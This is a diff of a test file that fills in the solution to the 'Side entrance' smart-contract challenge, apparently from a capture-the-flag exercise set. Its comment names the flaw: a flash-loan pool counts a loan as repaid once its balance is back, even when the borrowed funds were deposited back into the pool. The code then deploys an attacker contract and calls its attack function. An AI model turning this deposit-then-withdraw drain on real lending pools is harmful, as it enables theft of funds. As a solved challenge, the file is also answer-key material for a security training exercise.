@@ -24,7 +24,19 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT -- SOLVED */
+        /** 
+         * vulnerability: flashLoan function of pool checks the balance of its address,
+         * and not whether the loan was sent back by the receiver
+         * 
+         * hack: deposit the loan back into the pool, and then withdraw
+         * */
+        const SideEntranceChallenge = await ethers.getContractFactory("SideEntranceChallenge", attacker);
+        const sec = await SideEntranceChallenge.deploy(this.pool.address);
+        await sec.deployed();
+
+        sec.attack();
+        
     });
 
     after(async function () {
